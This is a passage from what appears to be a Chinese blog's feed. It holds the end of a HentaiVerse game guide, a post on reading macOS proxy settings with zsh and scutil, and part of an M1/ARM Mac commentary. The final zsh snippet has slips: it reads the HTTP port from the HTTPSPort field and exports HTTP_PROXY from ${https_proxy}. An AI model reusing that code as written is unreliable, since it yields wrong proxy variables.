级以上的玩家</li>\n</ul>\n<h2>培养方向</h2>\n<h3>技能点</h3>\n<p>这一节的内容适用于所有风格，不论是法师、战士还是战法师。</p>\n<p>不要把技能点浪费在你不主动使用的能力上（比如你是一名元素法师，就不应该加圣、暗的技能），技能只有在装配在支配槽中才会起作用。在低等级时你升级获得的技能点会远比你需要的多，但是到 200 级以后你的技能点就会不够用了。你需要通过 <a href=\"https://ehwiki.org/wiki/training\">训练</a>「Ability Boost」来获得更多的技能点。</p>\n<h4>应该加的技能</h4>\n<ul>\n<li>HP Tank（非常重要）：血条，直接决定你的生存几率</li>\n<li>MP Tank（非常重要）：蓝条，非常有用</li>\n<li>Better Cure（非常重要）：减少冷却时间、增加治疗的 HP 量。在 HentaiVerse 里 HP 药水效果一般，你会更依赖治疗咒语。</li>\n<li>Better Regen（非常重要）：提供更有效且更持久的回血</li>\n<li>Better Protection（非常重要）：极大地提升生存几率</li>\n<li>对应装备和战斗风格的技能（非常重要）：随着熟练度提升将有效提升你的任务属性</li>\n<li>Better Mana Pots（重要）：MP 药水是战斗必带的回复品</li>\n<li>Better Haste（重要）：增加你攻击、施法的速度，因此你可以攻击更多的怪物，有效提升你的生存几率</li>\n<li>Stronger Spirit（重要）：让灵力盾可以消耗更少的 SP、更早的抵御攻击</li>\n<li>SP Tanks（重要）：对于战士来说，这是保持灵动架势必备的。而灵力盾和生命火花也依赖 SP 才能发挥作用</li>\n<li>Better Shadow Veil：更高的回避率加成意味着更高的生存几率</li>\n<li>Better Imperil（可选）：削弱怪物的缓伤，对于法师来说是个不错的选择</li>\n<li>Faster Imperil（可选）：降低 Imperil 的消耗和冷却时间、增加受影响的目标，特别适合法师</li>\n<li>Better Spark（可选）：大部分玩家都会通过 IA 自动施放生命火花，此时只能帮助你减少 MP 消耗。一旦你升到 150 级以上，你就会经常看到带有 SP 条的怪物了，而怪物的 SP 攻击可以对你造成极大的伤害、甚至能秒杀你，而生命火花就是你的最后一道保障（译者注：「生命火花」类似于 Minecraft 的「不死图腾」）</li>\n</ul>\n<h4>不推荐的技能</h4>\n<ul>\n<li>Better Drain：造成的伤害非常有限</li>\n<li>Faster Drain：枯竭咒语本身的施法速度就够快了，而冷却时间却不会变短很多</li>\n<li>Better Absorb：很一般的咒语，大部分怪物并不会进行魔法攻击。只有在打 Boss 时会有点用</li>\n<li>Better Slow：Better MagNet 显然是个更合适的选择</li>\n<li>Mind Control：并没有什么用</li>\n<li>Better Blind 和 Faster Blind：Weaken 咒语效果更明显</li>\n<li>Ether Theft：对法师来说是多余的</li>\n</ul>\n<h3>法师哲学</h3>\n<p>法师是一种游走在边缘的职业，尝试在怪物秒杀你之前 秒杀他们。</p>\n<ul>\n<li>310 级以前不建议尝试</li>\n<li>依赖高伤害和回避率生存</li>\n<li>高投入、高回报</li>\n</ul>\n<h3>战士哲学</h3>\n<ul>\n<li>通过高缓伤和再生咒语生存，使用格挡、回避和招架防御。</li>\n<li>战士也需要 MP 维持 BUFF，必要时还要使用 DEBUFF</li>\n<li>200 级以前，尽量确保命中率高于 100%</li>\n</ul>\n<h2>难度调整</h2>\n<p>随着你的等级不断提升，你将会遇见更强大的怪物，战力大多都在 400 以上（拥有 SP 攻击的能力）。从 150 级开始难度就会显著增加，因此你应该适时做一些难度调整。</p>\n<ul>\n<li>尽量选择 Hard 以上难度，以便获得 Shard</li>\n<li>获得更好的装备（尤其是武器），数值比装备等级更重要</li>\n<li>多多使用 BUFF 和 DEBUFF</li>\n<li>第一个 IA 自动施法槽只需要 50H，非常非常非常非常划算的投资</li>\n</ul>\n<h2>装备</h2>\n<p>等级较低的玩家应该多逛逛 E-hentai 社区，领取免费装备和每周的补给（药水、卷轴等）。品质高的装备的属性不一定比品质低的装备好，因此选择和更换装备时三思而后行。</p>\n<h2>物品</h2>\n<ul>\n<li>药水是拿来喝的，不是拿来收藏的。</li>\n<li>喝药水和使用卷轴不计入 turn，所以为啥不多用用呢？</li>\n<li>长效药一般用于较长的战斗，普通药水用于应急，丹药（译者注：中文圈玩家一般称之为「大药」）是在紧急情况下、普通药水的冷却时间还没过、或想要同时获得两种效果时使用的。一些老玩家会给新玩家发放免费药水，去 E-hentai 社区 HentaiVerse 版块的 WTS 分区里看看？</li>\n<li>浴血擂台中 Flying Spaghetti Monster 是性价比最高的，其余的挑战通一次就够了。</li>\n<li>只有你自信能在 PFUDOR 难度打败 Triple Trio and the Tree 时再去刷。</li>\n</ul>\n<h2>怪物实验室</h2>\n<ul>\n<li>你想什么时候去看看就去，只需要记住怪物给予礼物的间隔至少为一小时，而且较弱的怪物一般很少给予礼物。</li>\n<li>如果一个怪物过去 3 天没有给你礼物的怪物，那么接下来他一定会给予你一个礼物。</li>\n<li>怪物的名字越有趣越好，不要用序号或者脸滚键盘为怪物取名。</li>\n</ul>\n<h2>雪花祭坛和奖杯</h2>\n<ul>\n<li>你可以通过献祭奖杯换取装备，也可以随时将它们卖掉。它们在雪花祭坛的价值不会改变，因此囤积它们没有实际意义。</li>\n<li>奖杯永远不要卖给系统店，要么献祭掉、要么卖给玩家（比系统店的价格要高得多）。</li>\n</ul>\n<h2>训练</h2>\n<p>训练会极大程度的消耗你的 Credits，并且除了 Adept Learner 和 Ability Boost 以外很难给你提供太多加成：将 Scavenger 训练满将会花费你 1700 万 Credit，但是掉落几率不过从 10% 提升到 12.5% 而已（译者注：在中文圈玩家中，四个增加掉落率的训练被称为「四大」，因为「四大皆空」）。</p>\n<h2>武器店和道具店</h2>\n<p>武器店里卖的装备要么等级太高、要么等级太低，不如在 社区 HentaiVerse 版块的 WTS 分区里直接向玩家购买。道具店里的东西一般很贵，WTS 版块里要便宜一些，但是去 <a href=\"https://hvmarket.xyz/\">HVMarket</a> 购买最划算。</p>\n<h2>熔炉</h2>\n<ul>\n<li>每项属性的前 5 次升级都不消耗站粘合剂，性价比高；而当你分解装备时，强化材料的 90% 原料都会返还给你，因此在低等级时升级装备还是相对划算的。</li>\n<li>叠加装备附魔不会增强效果，只会增加持续的时间。</li>\n<li>当你装备获得了不想要的潜能时，马上重新锻造它，因为每一级装备潜能意味着需要一片重铸碎片。</li>\n<li>除非你是土豪，否则不要购买灵魂碎片。每天打遭遇战可以获得至多 60 片灵魂碎片。</li>\n</ul>\n<div class=\"license\"> <div class=\"license-title\">[译] HentaiVerse 建议和指导</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hentaiverse-advice/\">https://blog.skk.moe/post/hentaiverse-advice/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-12-24</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hentaiverse-advice/"},{"title":"ZSH 自动读取 macOS 系统代理配置并设置环境变量","date":"2020-12-07 02:47:00","description":"\n<p>和其它 Linux 的 DE 一样，macOS 也支持在「系统偏好设置」中设置 HTTP 代理、HTTPS 代理，但是 macOS 并不会在终端（Terminal、iTerm）的 shell 中自动生效系统代理配置。为了方便日常使用，我决定好好研究一下 macOS 的系统代理。</p>\n<h2>macOS 系统代理的行为</h2>\n<p>和 Linux 和 Windows 只有一种系统代理配置不同，macOS 为每一种网络设备（Wi-Fi、Ethernet、Bluetooth PAN 等）维护了独立的网络配置，包括代理配置在内。因此当切换网络设备时，macOS 会使用不同的代理配置；如果同时连接了多个网络设备，则操作系统会优先采用在「系统偏好设置」网络「Service Order」靠上的设备的代理配置：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/1.png\" class=\"lazy post-img\"></p>\n<p>和大部分 Linux 桌面环境一样，系统偏好设置中的代理设置在 shell session 中是不会生效的，在终端中使用代理、需要手动提供 <code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code> 和 <code>ALL_PROXY</code> 环境变量。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/2.png\" class=\"lazy post-img\"></p>\n<h2>在终端获取 macOS 系统代理配置</h2>\n<p>macOS 内置了许多实用的命令行工具，如 <code>xcode-select</code> 用于安装命令行工具和配置 Xcode、<code>build_webkit</code> 用于编译 WebKit、<code>softwareupdate</code> 用于获取系统更新等。在读取系统代理配置方面，macOS 提供了三种方法：</p>\n<pre><code class=\"hljs bash\">$ system_profiler SPNetworkDataType <span class=\"hljs-comment\"># 获取完整网络配置信息</span>$ networksetup -listallnetworkservices <span class=\"hljs-comment\"># 列举所有网络设备</span>$ networksetup -getwebproxy Wi-Fi <span class=\"hljs-comment\"># 获取特定网络设备的系统代理配置</span>$ scutil --proxy <span class=\"hljs-comment\"># 获取当前已启用的代理配置，是对 system_profiler 的封装</span></code></pre>\n<p>其中，第三种命令的输出最简洁，适合在 shell 中解析：</p>\n<pre><code class=\"hljs bash\">$ scutil --proxy&lt;dictionary&gt; {  ExceptionsList : &lt;array&gt; {    0 : 127.0.0.1    1 : 192.168.0.0/16    2 : 10.0.0.0/8    3 : 172.16.0.0/12    4 : 100.64.0.0/10    5 : 17.0.0.0/8    6 : localhost    7 : *.<span class=\"hljs-built_in\">local</span>    8 : 169.254.0.0/16    9 : 224.0.0.0/4    10 : 240.0.0.0/4  }  ExcludeSimpleHostnames : 1  HTTPEnable : 1  HTTPPort : 6152  HTTPProxy : 127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<h2>解析 <code>scutil</code> 输出</h2>\n<p>虽然使用 <code>awk</code> 可以轻易解析上述输出，但是正如我在「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」一文中所介绍的，应避免使用外部进程、尽可能使用 zsh 内置语法。而应对字符串操作，zsh 也已经绰绰有余了。</p>\n<p>首先，为了获取代理配置不可避免的要生成一个 <code>scutil</code> 的子进程，为了避免子进程的反复生成，应该把输出缓存下来：</p>\n<pre><code class=\"hljs bash\">SCUTILS_PROXY=$(scutil --proxy)</code></pre>\n<p>接着判断代理是否启用。如果配置了代理，则 <code>xxEnable :</code> 的字段值为 1，反之则字段值为 0 或直接整个字段不存在，因此可以使用 zsh 字符串搜索语法搜索 <code>xxEnable : 1</code>，以 HTTP 代理为例：</p>\n<pre><code class=\"hljs bash\">HTTP_PROXY_ENABLED_PATTERN=<span class=\"hljs-string\">\"HTTPEnable : 1\"</span><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-comment\"># HTTP 代理已启用</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<blockquote><p><code>(I)</code> 是 zsh 中的字符串从右往左搜索的语法，返回值为找到匹配时的位置；当没有找到匹配时，zsh 会一路搜索到字符串最左侧、最终返回值是 0。因此 <code>(I)</code> 常见的用法是配合数值条件 <code>(( ))</code> 判断变量是否包含某一字符串，这种写法的性能是 <code>[[ ]]</code> 的三倍。</p></blockquote>\n<p>接下来是获取代理的主机名和端口，HTTP 代理使用到的字段是 <code>HTTPProxy</code> 和 <code>HTTPPort</code>。使用 zsh 的「左端最小匹配截断」语法截取 <code>HTTPProxy</code> 字段内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<blockquote><p><code>#*</code> 是「左端最小匹配截断」、<code>##*</code> 是「左端最大匹配截断」，此外还有 <code>%*</code> 和 <code>%%*</code>，分别是「右端最小匹配截断」和「右端最大匹配截断」</p></blockquote>\n<p>接下来是使用 zsh 的多行字符串语法获取第一行内容、以将右端多余的内容略去：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>127.0.0.1</code></pre>\n<blockquote><p>使用 zsh 内置的 <code>(f)</code> flag 用于多行字符串的遍历和截断，比调用外部进程 <code>head</code> 要快得多</p></blockquote>\n<p>用同样的方法获取端口字段的内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>6152</code></pre>\n<p>最后拼凑字段、添加到环境变量即可：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>    HTTP_PROXY_HOST=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>    HTTP_PROXY_PORT=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>    <span class=\"hljs-built_in\">export</span> http_proxy=<span class=\"hljs-string\">\"http://<span class=\"hljs-variable\">${HTTP_PROXY_HOST}</span>:<span class=\"hljs-variable\">${HTTP_PROXY_PORT}</span>\"</span>    <span class=\"hljs-built_in\">export</span> HTTP_PROXY=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${https_proxy}</span>\"</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<p>同理，用相同的方法可以获取到其它代理服务器配置。将代码添加到 <code>.zshrc</code> 中，每次新建一个 shell session 时即可自动读取并添加相关环境变量。</p>\n<h2>zsh-osx-autoproxy</h2>\n<p>基于上述介绍的方法，我封装了一个 oh-my-zsh 插件 <a href=\"https://github.com/SukkaW/zsh-osx-autoproxy\">zsh-osx-autoproxy</a>，启用插件后即可自动获取 HTTP 代理、HTTPS 代理、FTP 代理的设置，并在当前 shell 环境中添加相应环境变量（<code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code>、<code>ALL_PROXY</code>、<code>FTP_PROXY</code>）。oh-my-zsh 用户可以通过下述命令完成安装：</p>\n<pre><code class=\"hljs bash\">git <span class=\"hljs-built_in\">clone</span> https://github.com/sukkaw/zsh-osx-autoproxy <span class=\"hljs-variable\">${ZSH_CUSTOM:-~/.oh-my-zsh/custom}</span>/plugins/zsh-osx-autoproxy<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"plugins+=(zsh-osx-autoproxy)\"</span> | tee -a .zshrc</code></pre>\n<p>新建一个终端会话（或使用 <code>source ~/.zshrc</code>） 即可生效。</p>\n<div class=\"license\"> <div class=\"license-title\">ZSH 自动读取 macOS 系统代理配置并设置环境变量</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/\">https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-12-07</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/"},{"title":"谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来","date":"2020-11-11 16:13:00","description":"\n<p>2020 年 11 月 11 日，苹果在本年度最后一次 Apple Events 上发布了全新的 ARM 芯片 M1、以及三款搭载了 M1 的 Mac：MacBook Air、MacBook Pro 13‘ 和 Mac Mini。在 WWDC 2020 库克宣布 Apple Silicon 后，这次 Apple Events 再一次掀起了热潮，不少 KOL 都把 M1 奉若神明，不少人也不以为然。本文通过 8 个问题来简单聊聊 M1 和 ARM Mac。</p>\n<h2>M1 芯片的性能如何？</h2>\n<p>本文写就时，搭载 M1 的 Mac 尚未开始发货，我们能看到的只有 GeekBench 上流出的跑分。所以，让我们先从跑分开始看起？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/3.jpg\" alt=\"3\" width=\"1280\" height=\"901\" class=\"lazy post-img\"></p>\n<p>哇！Geekbench 跑分数据告诉我们，M1 和 A14X 可以直接打败 5950X、直接把 Tiger Lake 摁在地上摩擦？这已经不是踩爆 Intel 的牙膏了好伐，这是已经快进到 AMD 原地倒闭了好伐！给 Apple 倒一杯卡布奇诺好吗，快给 Apple 倒一杯卡布奇诺！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/4.jpg\" alt=\"4\" width=\"965\" height=\"569\" class=\"lazy post-img\"></p>\n<p>啊，什么？这 Geekbench 还说 Intel 的 Tiger Lake 可以吊打 4700U？嗯？嗯~？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/1.jpg\" alt=\"1\" width=\"1280\" height=\"893\" class=\"lazy post-img\"></p>\n<p>过了一个小时 Geekbench 就更新了排名数据，所以，现在 5950X 和 5900X 的分数又高过 M1 和 A14X 了？</p>\n<p>看了上面这三张图，你应该大致知道像 Geekbench 这样的跑分纯属娱乐了吧。「众所周知」跑分不代表真实体验。所以我们还是看看苹果发布会上给的图表吧：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/2.png\" alt=\"2\" width=\"1523\" height=\"846\" class=\"lazy post-img\"></p>\n<p>什么，苹果竟然敢说自己的 M1 比最先进的 PC 芯片的性能还要强大 …… 哦，我眼睛业障重啊，这图表的标题后面、还跟着一个「Per Watt（每瓦）」啊。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/5.jpg\" alt=\"5\" width=\"1280\" height=\"818\" class=\"lazy post-img\"></p>\n<p>苹果的意思是，自从 Mac 实装了 M1、Mac 的功耗比直接大幅提升，苹果并没有直接说 M1 性能有多好嘛！你看看苏妈在 AMD 发布会上晒的性能图表、条形图都快超到会场外面去了，苹果你在发布会上搞这么含蓄干什么嘛！</p>\n<p>如果苹果在发布会上只强调能耗比有多么高、功耗有多么低，丝毫不提 M1 的绝对性能，甚至没有透露 M1 的频率，对于 M1 芯片的能耐和优势相信读者也有大概的猜测了。至于苹果在发布会上展示搭载了 M1 的 Mac 比往年的同系列 Mac、CPU 性能提升超过 2.8 倍乃至 3.5 倍、GPU 性能提升则有 5 至 6 倍，我会留给后面「如何评价这率先搭载 M1 的三款 Mac？」问题再谈。</p>\n<h2>对 ARM 架构的处理器性能的一瞥</h2>\n<p>从一开始我就没有怀疑苹果是否能实现用于桌面端的 ARM 芯片。苹果操刀数款移动 CPU 的经历，驾驭 ARM 自然是轻车熟路的。</p>\n<p>那么 ARM 有什么优势呢？在手机和平板上 ARM 大放异彩，近几年几乎再没有看到搭载 X86 的智能手机了；不少 IoT 设备、单片机也开始积极使用 ARM 架构；而桌面端 PC 使用 ARM 的却少之又少。从市场上来看，ARM 架构似乎更适用于低功耗、不强调性能和 CPU 密集型计算的平台，但这并不是意味着 ARM 架构本身没有用于 CPU 密集型计算的潜力。今年 6 月 22 日刷新了全球超级计算机的「TOP500」榜单、成为第一的是来自日本理化学研究所（RIKEN）的「Fugaku」（富岳）超级计算机，峰值计算速度达到 513.9 PFlops。而 Fugaku 搭载的富士通的 7nm 48C SoC 正是 ARM 架构。</p>\n<p>作为半导体行业的门外汉，我没有资格谈论 X86 的 CISC 和 ARM、MIPS 等的 RISC 之间孰优孰劣。但从历史的长河里，我们还是能从 ARM 代替 X86 的企图中略窥一二的，其中最接近成功的一次来自 Cloudflare。2017 年 8 月，Cloudflare 尝试从 Intel Skylake 的处理器（E5-2630 v4）切换到由高通提供的 Centriq 平台。从数据上来看，高通提供的平台在当时非常有吸引力：相比 Intel Skylake 的 的 12C24T 2.1GHz，高通 Centriq 平台搭载的 Falkor 核心达到了 46C46T 2.5GHz；相比 Intel 的 170W 的 TDP、高通 Falkor 的 TDP 只有 120W；与 Intel 的 AVX512 指令集对应的，高通也有自己的 NEON 指令集。</p>\n<p>虽然众多 Linux 发行版和依赖库都提供有 ARM64 版本，但是当软件时，Cloudflare 犯了难。Cloudflare 高度依赖基于 NGINX 开发的 Web Server。虽然 NGINX 本身支持 ARM64，但是 NGINX 同时使用了大量的库如用于 gzip 压缩的 zlib 和用于 TLS 的 BoringSSL；而且 Cloudflare 自身还高度依赖来自 OpenResty 的 lua-nginx-module，以及与之对应的 LuauJIT，但不幸的是 LuaJIT 在当时并不支持 ARM64；除此以外，Cloudflare 许多技术还基于用 Go 编写的 RRDNS，在当时也没有 ARM64 的版本。</p>\n<p>除此以外，Cloudflare 在使用 Intel 和 Falkor 进行 OpenSSL 性能基准测试中发现，OpenSSL 公钥交换的性能高度依赖单核 CPU 频率，因此在测试中 Broadwell 竟超过 Skylake 胜出、而 Falkor 排在了垫底的位置；在对称密钥性能方面，Skylake 由于 AVX512 而遥遥领先（期间 CPU 频率甚至维持在 1.4GHz），Broadwell 由于只有 AVX2 落后于第二，而 NEON 使高通再次垫了底。而在 Cloudflare 展开的其它性能测试，如 gzip 压缩性能测试、brotli 压缩性能测试、LUAJIT 性能测试，以及 Go 的 Crypto 库、gzip 库、Go 正则表达式与字符串操作性能测试中，高通的 Falkor 都远远落后，在不少测试中性能甚至只有 Skylake 和 Broadwell 的百分之一。你可以在 <a href=\"https://blog.cloudflare.com/arm-takes-wing/\">Cloudflare 博客中找到他们的性能测试结果</a>。随后，Cloudflare 的数据中心仍旧采用基于 Intel X86 的服务器，直到今年三月，<a href=\"https://blog.cloudflare.com/technical-details-of-why-cloudflare-chose-amd-epyc-for-gen-x-servers/\">Cloudflare 将 AMD EPYC 引入了他们的新一代服务器</a>，虽然 Cloudflare 对 ARM64 满怀信心，但是他们的基础设施依然是基于 X86 的。</p>\n<p>这并不是说 ARM 具有天生的性能劣势（再看看「Fugaku」超算），而是绝大部分行业的程序、甚至是一些编程语言都不是为 ARM 设计、针对 ARM 优化的。优化软件使其能够让 ARM 的硬件完整发挥出完整的性能，还有非常漫长的一段路要走。</p>\n<h2>搭载了 M1 的 Mac 能否运行 Windows？</h2>\n<p>相比之前的长篇大论，这个问题的答案就简单多了 —— 「几乎不可能」，或者就是「不可能」。</p>\n<p>ACPI（Advanced Configuration and Power Interface，高级配置与电源接口）最早早期 1997 年由 Intel、微软、东芝共同提出，后来凤凰科技（做 BIOS 那个）和惠普先后加入规范制定中，自 2006 年起规范制定的工作被交给了 <a href=\"https://uefi.org/\">UEFI 社区</a>。Windows 98 是第一个支持 ACPI 的操作系统，Windows Vista 以后的 Windows 则要求电脑 <strong>必须支持 ACPI</strong>；Linux 虽然不需要 ACPI 也可以运行，但是在现代设备上禁用 ACPI 将会导致绝大部分硬件无法运行；就连 Android 智能设备中也内置了一个精简的 ACPI；2005 年苹果将 Mac 从 PowerPC 架构迁移到 Intel 架构（相关的故事我在另一篇文章「<a href=\"https://blog.skk.moe/post/history-osx86/\">黑苹果的历史</a>」中有详细介绍），Mac 也开始采用 ACPI。但是搭载了 iOS 的 iPhone、iPad 并没有 ACPI，苹果的智能移动设备完全使用自己的私有架构，使用名为「iBoot」的 Bootloader。</p>\n<p>从 WWDC 2020 上发布的 ARM DTK 上，通过 IORegistryExplorer 上我们可以发现运行 macOS Big Sur for ARM 的 DTK 上完全没有 ACPI。我们因此可以猜测，搭载 M1 的 Mac 也一样不存在 ACPI、使用和 iPhone、iPad 一样的 IBoot 作为 Bootloader。如果是这样的话，搭载 M1 的 Mac 上是 <strong>几乎没有可能</strong> 运行 Windows 的，甚至运行 Linux 都将非常受限。虽然不排除苹果为 ARM Mac 增加 ACPI 兼容层的可能，但是考虑到 WWDC 2020 和本次 Apple Events 上都对 BootCamp 缄口不言，基本上已经确定了本次发布的这三款搭载 M1 的 Mac 是绝无可能再运行 Windows 了。</p>\n<h2>如果搭载 M1 的 Mac 几乎没有可能直接运行 Windows，那么虚拟机呢？</h2>\n<p>相比在 X86 上提供的虚拟机增强 Feature Flag，为 ARM 提供虚拟化技术要有趣一些。ARM 虚拟化需要将 Hypervisor 插入到 Exception Level 2，然后再在 TrustZone 上提供虚拟化的功能，说人话就是 ARM 的虚拟化是在架构层面上实现的，因此苹果的 M1 如果要实现虚拟化并不难。但是考虑到苹果现在从硬件到系统都实现了完整的控制，是否提供虚拟化功能完全由苹果控制，如果苹果不启用，谁都无法绕过限制。</p>\n<p>截止到本文写就，<a href=\"https://www.parallels.com/blogs/parallels-desktop-apple-silicon-mac/\">Parallels Desktop 完全无法在 ARM Mac 上运行虚拟机</a>，但是 Parallels Desktop 已经着手对新版本的活跃开发了。考虑到虚拟机的 ACPI 实现和宿主机是完全独立的，只要苹果开放虚拟化，在 ARM Mac 上运行虚拟机是完全可行的。但是，苹果是否会选择开放虚拟化，又和苹果的目标用户战略、M1 本身的性能是相关的。</p>\n<h2>搭载了 M1 的 Mac 能否运行 PhotoShop？</h2>\n<p>这个问题的答案在发布会上有了明确的解答，我们完全无需猜测：「现在不行，不过明年就会有了」。</p>\n<p>在 WWDC 2020 上，库克就在 ARM DTK 上演示了玛雅的运行，但是对 Adobe Photoshop 却一笔带过、表示「仍在适配中」。而在这次 Apple Events 上，苹果软件部门的 SVP 克雷格·费德里吉是这么介绍的：</p>\n<blockquote>\n<p>And Adobe is bringing universal version of their Apps, staring with Lightroom next month, and other collection of apps including Photoshop early next year.</p>\n<p>而且 Adobe 也开始带来他们的通用应用，将从下个月的 Lightroom 开始，而包括 Photoshop 在内的其它应用（的 ARM 版本）则会在明年年初到来。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/7.jpg\" alt=\"7\" width=\"1280\" height=\"803\" class=\"lazy post-img\"></p>\n<p>那么，为什么大部分应用都可以很快地发布 Intel、ARM 通用版本，而 Adobe 全家桶却需要再等好几个月？因为 Adobe 从 2019 年开始大部分应用都高度依赖基于 Intel 特殊数学函数库 —— Intel Math Kernel Library（intel-mkl），以及其它一些 Intel 特殊指令集用于硬件加速（涉及到的有 MXMCore、FastCore、CameraRAW 等）。因此即使在搭载了同为 X86 的 AMD 处理器上安装黑苹果，使用 Photoshop 的某些功能也会导致闪退甚至 Kernel Panic；同理，AMD 黑苹果无法运行 MatLab，或者即使能够运行、运算速度也非常缓慢，也是由于缺乏 intel-mkl 导致的。搭载了 M1 芯片的 Mac 自然也无法调用 intel-mkl 库，因此 Adobe 需要几乎重写所有的功能实现，才能让他们的软件在 ARM Mac 上流畅运行。</p>\n<h2>如何评价率先搭载 M1 的三款 Mac？</h2>\n<p>在 Apple Events 上，苹果率先发布了三款搭载了 M1 的 Mac，其中搭载了 M1 的 MacBook Air 相比上一代搭载了 Intel i7 处理器的 MacBook Air（2020 年 3 月推出），CPU 性能提升了 3.5 倍、GPU 图形性能提升了 5 倍。但是，这是和哪一款 Intel i7 对比的呢？上市于 Q2’20 的 i7-1060NG7、Ice Lake、10nm、基础频率 1.20GHz、搭载的是 Iris Plus 核显、TDP 10W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/8.png\" alt=\"8\" width=\"982\" height=\"547\" class=\"lazy post-img\"></p>\n<p>那 Mac Mini 呢？苹果比表示搭载了 M1 的 Mac Mini 相比上一代搭载了 Intel 处理器的 Mac Mini，CPU 性能提升了 3 倍、GPU 图形性能提升了 6 倍。那么在苹果官网的脚注里写的是和哪一款 Mac Mini 进行的对比呢？对比的是于 2018 年发布的 Mac Mini，搭载了上市于 Q3’18 的 i3-8100B、Coffee Lake、14nm++、基础频率 3.6GHz（无睿频）、搭载的是臭名昭著的 UHD 630 核显，TDP 65W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/9.png\" alt=\"9\" width=\"993\" height=\"377\" class=\"lazy post-img\"></p>\n<p>苹果发布的第三款搭载 M1 的 Mac 是 MacBook Pro 13’，相比上一代搭载了 Intel i7 的 MacBook Pro 13’，CPU 性能提升 2.8 倍、GPU 图形性能提升了 5 倍，而这一性能提升是和 i7-8557U 对比出来的，上市于 Q3’19、Coffee Lake、14nm++、基础频率 1.7GHz、搭载 Iris Plus 645 核显、TDP 15W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/10.png\" alt=\"10\" width=\"1002\" height=\"544\" class=\"lazy post-img\"></p>\n<p>注意到没有，苹果在发布会上对比性能提升时，一直都使用的「best in class」（同类别）、「We have ever created」（我们制造过的）、「better than previous generation」（比上一代更好）的说辞。而当我们真正去注意苹果官网产品页面的脚注，才会发现苹果对比的产品并不是加强了 ML 的 Tiger Lake、并不是 Xe 核显或是 VEGA 显卡，而是 CoffeeLake 的降压 U 和孱弱的 Ice 